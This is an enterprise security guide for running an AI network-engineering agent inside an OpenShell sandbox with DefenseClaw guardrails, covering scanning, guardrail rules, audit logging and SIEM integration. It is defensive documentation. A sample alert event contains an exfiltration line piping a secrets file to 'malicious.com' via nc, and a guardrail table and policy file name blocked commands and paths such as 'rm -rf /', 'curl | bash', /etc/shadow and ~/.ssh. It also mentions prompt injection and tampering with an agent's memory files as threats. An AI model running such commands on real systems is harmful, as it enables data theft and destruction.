# DefenseClaw + OpenShell Enterprise Security Guide

**DefenseClaw** from Cisco AI Defense + **OpenShell** from NVIDIA provide comprehensive enterprise security for NetClaw. Together they deliver container-based isolation, runtime guardrails, and full audit compliance.

---

## Table of Contents

1. [Security Stack Overview](#security-stack-overview)
2. [Installation](#installation)
3. [Running NetClaw Securely](#running-netclaw-securely)
4. [OpenShell Sandbox](#openshell-sandbox)
5. [Component Scanning](#component-scanning)
6. [Runtime Guardrails](#runtime-guardrails)
7. [Tool Management](#tool-management)
8. [Audit & Compliance](#audit--compliance)
9. [SIEM Integration](#siem-integration)
10. [Troubleshooting](#troubleshooting)
11. [Quick Reference](#quick-reference)

---

## Security Stack Overview

The NetClaw enterprise security stack combines two technologies:

| Component | Provider | Purpose |
|-----------|----------|---------|
| **OpenShell** | NVIDIA | Container-based sandbox isolation |
| **DefenseClaw** | Cisco AI Defense | Runtime guardrails, scanning, audit |

### Security Features

| Feature | Component | Description |
|---------|-----------|-------------|
| **Container Sandbox** | OpenShell | Docker-based isolation with YAML policies |
| **Component Scanning** | DefenseClaw | Static analysis of skills, MCPs, plugins before execution |
| **CodeGuard Analysis** | DefenseClaw | Detects credentials, eval(), shell commands, SQL injection |
| **LLM Inspection** | DefenseClaw | Monitors prompts and completions across 7 AI providers |
| **Tool Call Inspection** | DefenseClaw | Enforces 6 rule categories on all tool executions |
| **Audit Logging** | DefenseClaw | SQLite database with compliance-ready exports |
| **SIEM Integration** | DefenseClaw | Splunk HEC, OTLP HTTP, webhooks |

### Architecture

```
┌──────────────────────────────────────────────────────────────────┐
│                    NVIDIA OpenShell Sandbox                       │
│              (Docker container with YAML policies)                │
│  ┌────────────────────────────────────────────────────────────┐  │
│  │                      DefenseClaw                            │  │
│  │              (Runtime guardrails + scanning)                │  │
│  │  ┌──────────────────────────────────────────────────────┐  │  │
│  │  │                      NetClaw                          │  │  │
│  │  │           (AI Network Engineering Agent)              │  │  │
│  │  │                                                       │  │  │
│  │  │   ┌─────────┐   ┌─────────┐   ┌─────────┐           │  │  │
│  │  │   │ Skills  │   │  MCPs   │   │ Plugins │           │  │  │
│  │  │   └─────────┘   └─────────┘   └─────────┘           │  │  │
│  │  └──────────────────────────────────────────────────────┘  │  │
│  │                                                             │  │
│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐        │  │
│  │  │  CodeGuard  │  │  Guardrails │  │   Audit     │        │  │
│  │  │  (Scanning) │  │  (Runtime)  │  │  (Logging)  │        │  │
│  │  └─────────────┘  └─────────────┘  └─────────────┘        │  │
│  └────────────────────────────────────────────────────────────┘  │
│                                                                   │
│  Isolation: File system, network, process namespaces              │
│  Policies: /etc/openshell/policies/*.yaml                         │
└───────────────────────────────────────────────────────────────────┘
```

---

## Installation

### Fresh Install

During NetClaw installation:

```bash
./scripts/install.sh
# When prompted:
# Enable DefenseClaw + OpenShell (recommended)? [y/N]: y
```

This installs both DefenseClaw and OpenShell automatically.

### Existing Installation

```bash
./scripts/defenseclaw-enable.sh
```

### Manual Install

```bash
# 1. Install NVIDIA OpenShell
curl -LsSf https://raw.githubusercontent.com/NVIDIA/OpenShell/main/install.sh | sh

# 2. Install Cisco DefenseClaw
curl -LsSf https://raw.githubusercontent.com/cisco-ai-defense/defenseclaw/main/scripts/install.sh | bash

# 3. Initialize DefenseClaw with guardrails
defenseclaw init --enable-guardrail

# 4. Start OpenShell gateway
openshell gateway start
```

### Prerequisites

| Requirement | Minimum | Check | Required For |
|-------------|---------|-------|--------------|
| Docker | Running | `docker info` | OpenShell sandbox |
| Python | 3.10+ | `python3 --version` | DefenseClaw |
| Go | 1.25+ | `go version` | DefenseClaw gateway |
| Node.js | 20+ | `node --version` | DefenseClaw plugin |

### Verify Installation

```bash
# Check OpenShell
openshell --version

# Check DefenseClaw CLI
defenseclaw --version

# Check DefenseClaw gateway
pgrep defenseclaw-gateway

# Check extension
ls ~/.defenseclaw/extensions/defenseclaw
```

---

## Running NetClaw Securely

### Option 1: One-Command Secure Startup (Recommended)

The `netclaw-secure-start.sh` script automates the entire enterprise security stack:

```bash
./scripts/netclaw-secure-start.sh
```

This single command:
1. **Ring 1**: Starts NVIDIA OpenShell gateway (container isolation)
2. **Ring 2**: Starts Cisco DefenseClaw gateway (runtime guardrails)
3. **Ring 3**: Creates NetClaw sandbox with latest OpenClaw
4. Migrates your config, API keys, and SOUL files to sandbox
5. Applies network policy (allows Slack, WebEx, LLM APIs, MCPs)

After the script completes:
```bash
# Connect to the secure sandbox
openshell sandbox connect netclaw

# Inside sandbox:
export HOME=/sandbox
openclaw gateway run &
openclaw tui
```

**Commands:**
```bash
./scripts/netclaw-secure-start.sh          # Start everything
./scripts/netclaw-secure-start.sh stop     # Stop sandbox
./scripts/netclaw-secure-start.sh status   # Check all 3 rings
```

### Option 2: Manual Sandbox Mode

For more control, set up each component manually:

```bash
# 1. Start OpenShell gateway (runs K3s cluster in Docker)
openshell gateway start

# 2. Create a NetClaw sandbox
openshell sandbox create netclaw

# 3. Run NetClaw inside the sandbox
openshell run netclaw -- claw
```

**What this provides:**
- Complete file system isolation
- Network namespace isolation
- Process isolation
- YAML-based policy enforcement
- DefenseClaw guardrails active inside sandbox

### Option 2: DefenseClaw Only (Guardrails without Container)

This runs NetClaw with DefenseClaw guardrails but without container isolation.

```bash
# 1. Start DefenseClaw gateway (if not already running)
defenseclaw-gateway &

# 2. Enable blocking mode (optional, recommended for production)
defenseclaw setup guardrail --mode action

# 3. Run OpenClaw/NetClaw normally
openclaw gateway &
claw
```

**What this provides:**
- Runtime guardrails (LLM inspection, tool call inspection)
- Component scanning (skills, MCPs, plugins)
- Audit logging
- No container isolation (runs on host)

### Option 3: Development/Hobby Mode (No Security)

```bash
# Just run OpenClaw directly
openclaw gateway &
claw
```

**Warning:** No security protections. Only use for local development.

---

## OpenShell Sandbox

OpenShell from NVIDIA provides container-based isolation for AI agents.

### Gateway Management

```bash
# Start the gateway (first time creates Docker container)
openshell gateway start

# Check gateway status
openshell gateway status

# Stop the gateway
openshell gateway stop

# Restart gateway
openshell gateway restart
```

### Sandbox Management

```bash
# Create a new sandbox
openshell sandbox create netclaw

# List all sandboxes
openshell sandbox list

# Delete a sandbox
openshell sandbox delete netclaw

# View sandbox logs
openshell logs netclaw
```

### Running Commands in Sandbox

```bash
# Run a single command
openshell run netclaw -- ls -la

# Run NetClaw/claw
openshell run netclaw -- claw

# Run with environment variables
openshell run netclaw --env ANTHROPIC_API_KEY=$ANTHROPIC_API_KEY -- claw
```

### Policy Configuration

Sandbox policies are defined in YAML:

```yaml
# /etc/openshell/policies/netclaw.yaml
name: netclaw
description: NetClaw network automation agent

filesystem:
  allow:
    - /workspace
    - /home/*/netclaw
    - /tmp
  deny:
    - /etc/passwd
    - /etc/shadow
    - ~/.ssh

network:
  allow_outbound:
    - "*.anthropic.com:443"
    - "*.openai.com:443"
    - "api.netbox.io:443"
  deny_outbound:
    - "*:22"  # No SSH from sandbox

resources:
  max_memory: 4Gi
  max_cpu: 2
```

### Network Policies

The secure startup script applies a comprehensive network policy that allows:

| Category | Allowed Endpoints |
|----------|-------------------|
| **Slack** | api.slack.com, wss-*.slack.com, files.slack.com |
| **WebEx** | webexapis.com, api.ciscospark.com |
| **LLM APIs** | api.anthropic.com, api.openai.com |
| **MCPs** | devnet.cisco.com, api.datadoghq.com, api.meraki.com |
| **Cloud** | AWS, Azure, GCP management APIs |
| **DevOps** | GitHub, GitLab, Terraform, Vault |

To modify the policy:
```bash
# View current policy
openshell policy get netclaw

# Apply custom policy
openshell policy set netclaw --policy my-policy.yaml --wait
```

### Troubleshooting OpenShell

```bash
# Check gateway health
openshell doctor

# View gateway logs
openshell logs gateway

# Force restart
openshell gateway stop && openshell gateway start
```

---

## Component Scanning

DefenseClaw scans all components (skills, MCPs, plugins) before execution using CodeGuard static analysis.

### Scan a Skill

```bash
defenseclaw skill scan pyats-health-check
```

**Output:**
```
Scanning skill: pyats-health-check
✓ No HIGH/CRITICAL findings
Status: ALLOWED
```

### Scan an MCP Server

```bash
defenseclaw mcp scan meraki-mcp
```

### Scan a Plugin

```bash
defenseclaw plugin scan custom-tool
```

### Finding Types

CodeGuard detects:

| Type | Severity | Example |
|------|----------|---------|
| `credential` | HIGH | Hardcoded API keys, passwords |
| `eval` | CRITICAL | Dynamic code execution |
| `shell` | HIGH | Shell command injection |
| `sqli` | CRITICAL | SQL injection vulnerabilities |
| `path_traversal` | MEDIUM | Directory traversal attacks |
| `weak_crypto` | MEDIUM | MD5, SHA1 for security |
| `unsafe_deser` | HIGH | Unsafe pickle/yaml loading |

### Auto-Blocking

Components with HIGH or CRITICAL findings are automatically blocked:

```
Scanning skill: bad-skill
✗ HIGH: Hardcoded credential detected
  Location: config.py:15
Status: BLOCKED
```

---

## Runtime Guardrails

Guardrails inspect all LLM calls and tool executions at runtime.

### Modes

| Mode | Behavior |
|------|----------|
| **observe** | Log violations, allow execution (default) |
| **action** | Log violations AND block dangerous operations |

### Change Mode

```bash
# Enable blocking mode
defenseclaw setup guardrail --mode action --restart

# Return to observe mode
defenseclaw setup guardrail --mode observe --restart
```

### Rule Categories

Guardrails enforce 6 categories:

| Category | Description | Example Blocked |
|----------|-------------|-----------------|
| `secret` | Credential exfiltration | Sending API keys to external URLs |
| `command` | Shell command execution | `rm -rf /`, `curl | bash` |
| `sensitive-path` | File system access | `/etc/passwd`, `~/.ssh/` |
| `c2` | Command & control | Connections to known malicious IPs |
| `cognitive-file` | AI memory manipulation | Writing to agent state files |
| `trust-exploit` | Prompt injection | Attempts to override system prompts |

### LLM Providers Supported

DefenseClaw inspects prompts/completions for:
- Anthropic (Claude)
- OpenAI (GPT)
- Google (Gemini)
- AWS Bedrock
- Azure OpenAI
- Cohere
- Mistral

---

## Tool Management

Explicitly block or allow specific tools.

### Block a Tool

```bash
defenseclaw tool block delete_file --reason "destructive operation"
```

### Allow a Tool

```bash
defenseclaw tool allow delete_file
```

### List Tool Rules

```bash
defenseclaw tool list
```

**Output:**
```
Blocked Tools:
- delete_file (reason: destructive operation)
- shell_exec (reason: security policy)

Allowed Tools:
- read_file
- list_directory
```

### Wildcard Patterns

```bash
# Block all write operations
defenseclaw tool block "*_write" --reason "read-only policy"

# Block specific MCP tools
defenseclaw tool block "meraki_delete_*" --reason "no deletions"
```

---

## Audit & Compliance

All operations are logged to a SQLite database for compliance.

### View Alerts

```bash
# Recent alerts
defenseclaw alerts

# With limit
defenseclaw alerts --limit 50

# Filter by severity
defenseclaw alerts --severity HIGH
```

### Export for Compliance

```bash
# JSON export
defenseclaw alerts --export json > audit-$(date +%Y%m%d).json

# CSV export
defenseclaw alerts --export csv > audit-$(date +%Y%m%d).csv
```

### Audit Record Fields

| Field | Description |
|-------|-------------|
| `timestamp` | When the event occurred |
| `event_type` | scan, block, alert, allow |
| `component` | skill, mcp, plugin, tool |
| `name` | Component or tool name |
| `severity` | LOW, MEDIUM, HIGH, CRITICAL |
| `category` | Rule category that triggered |
| `details` | Additional context |
| `outcome` | allowed, blocked, observed |

### Database Location

```
~/.defenseclaw/audit.db
```

Query directly with SQLite:
```bash
sqlite3 ~/.defenseclaw/audit.db "SELECT * FROM events ORDER BY timestamp DESC LIMIT 10;"
```

---

## SIEM Integration

Send security events to external SIEM systems in real-time.

### Splunk HEC

```bash
defenseclaw config siem --type splunk \
  --endpoint https://splunk.example.com:8088 \
  --token $SPLUNK_HEC_TOKEN
```

### OTLP (OpenTelemetry)

```bash
defenseclaw config siem --type otlp \
  --endpoint https://otel-collector.example.com:4318
```

### Webhook Notifications

```bash
# Slack
defenseclaw config webhook --slack $SLACK_WEBHOOK_URL

# PagerDuty
defenseclaw config webhook --pagerduty $PD_ROUTING_KEY

# Webex
defenseclaw config webhook --webex $WEBEX_WEBHOOK_URL

# Generic webhook
defenseclaw config webhook --url https://hooks.example.com/security
```

### Event Format

Events are sent in OCSF-compatible format:
```json
{
  "time": "2026-04-16T10:30:00Z",
  "severity": "HIGH",
  "category": "secret",
  "component": "tool",
  "name": "shell_exec",
  "outcome": "blocked",
  "details": {
    "command": "curl secrets.txt | nc malicious.com 1234"
  }
}
```

---

## Troubleshooting

### "defenseclaw: command not found"

Add to shell profile:
```bash
export PATH="$HOME/.local/bin:$PATH"
```

### Gateway won't start

1. Check port availability:
   ```bash
   lsof -i :8080
   ```

2. Check logs:
   ```bash
   tail -f ~/.defenseclaw/logs/gateway.log
   ```

3. Restart manually:
   ```bash
   defenseclaw-gateway restart
   ```

### Component falsely blocked

1. Check the finding:
   ```bash
   defenseclaw skill scan <name> --verbose
   ```

2. If false positive, add exception:
   ```bash
   defenseclaw exception add <component> --finding <id>
   ```

### SIEM events not arriving

1. Test connectivity:
   ```bash
   defenseclaw config siem --test
   ```

2. Check webhook logs:
   ```bash
   defenseclaw alerts --type webhook-failure
   ```

### Performance issues

Adjust scan timeout:
```bash
defenseclaw config set scan.timeout 30  # seconds
```

---

## Quick Reference

### Running Securely (Quick Start)

```bash
# Full sandbox mode (recommended)
openshell gateway start
openshell sandbox create netclaw
openshell run netclaw -- claw

# Or guardrails only (no container)
defenseclaw setup guardrail --mode action
claw
```

### OpenShell Commands

```bash
# Gateway
openshell gateway start                  # Start gateway
openshell gateway status                 # Check status
openshell gateway stop                   # Stop gateway

# Sandbox
openshell sandbox create <name>          # Create sandbox
openshell sandbox list                   # List sandboxes
openshell sandbox delete <name>          # Delete sandbox
openshell run <name> -- <cmd>            # Run in sandbox
openshell logs <name>                    # View logs

# Diagnostics
openshell doctor                         # Health check
openshell --version                      # Version
```

### DefenseClaw Commands

```bash
# Installation & Setup
defenseclaw --version                    # Check version
defenseclaw init --enable-guardrail      # Initialize guardrails

# Component Scanning
defenseclaw skill scan <name>            # Scan a skill
defenseclaw mcp scan <name>              # Scan an MCP
defenseclaw plugin scan <name>           # Scan a plugin

# Tool Management
defenseclaw tool block <tool> --reason   # Block a tool
defenseclaw tool allow <tool>            # Allow a tool
defenseclaw tool list                    # List rules

# Guardrails
defenseclaw setup guardrail --mode observe  # Logging only
defenseclaw setup guardrail --mode action   # Blocking mode

# Audit & Alerts
defenseclaw alerts                       # View alerts
defenseclaw alerts --export json         # Export JSON
defenseclaw alerts --severity HIGH       # Filter by severity

# Configuration
defenseclaw config siem --type splunk    # Setup SIEM
defenseclaw config webhook --slack URL   # Setup webhook
```

### File Locations

| Path | Purpose |
|------|---------|
| `~/.local/bin/openshell` | OpenShell CLI |
| `~/.local/bin/defenseclaw` | DefenseClaw CLI |
| `~/.local/bin/defenseclaw-gateway` | DefenseClaw gateway |
| `~/.defenseclaw/` | DefenseClaw home |
| `~/.defenseclaw/audit.db` | Audit database |
| `~/.defenseclaw/config.yaml` | DefenseClaw config |
| `/etc/openshell/policies/` | OpenShell policies |

### Configuration File

```yaml
# ~/.defenseclaw/config.yaml
guardrail:
  mode: observe  # or action
  rules:
    secret: true
    command: true
    sensitive-path: true
    c2: true
    cognitive-file: true
    trust-exploit: true

scan:
  timeout: 10
  auto_block: true
  severity_threshold: HIGH

siem:
  type: splunk
  endpoint: https://splunk.example.com:8088
  token: ${SPLUNK_HEC_TOKEN}

webhooks:
  - type: slack
    url: ${SLACK_WEBHOOK_URL}
```

---

## Related Documentation

- [Upgrade Guide](UPGRADE-TO-DEFENSECLAW.md) - For existing users
- [Security Principles](SOUL-DEFENSE.md) - Security posture guidance
- [DefenseClaw GitHub](https://github.com/cisco-ai-defense/defenseclaw) - Source code and issues
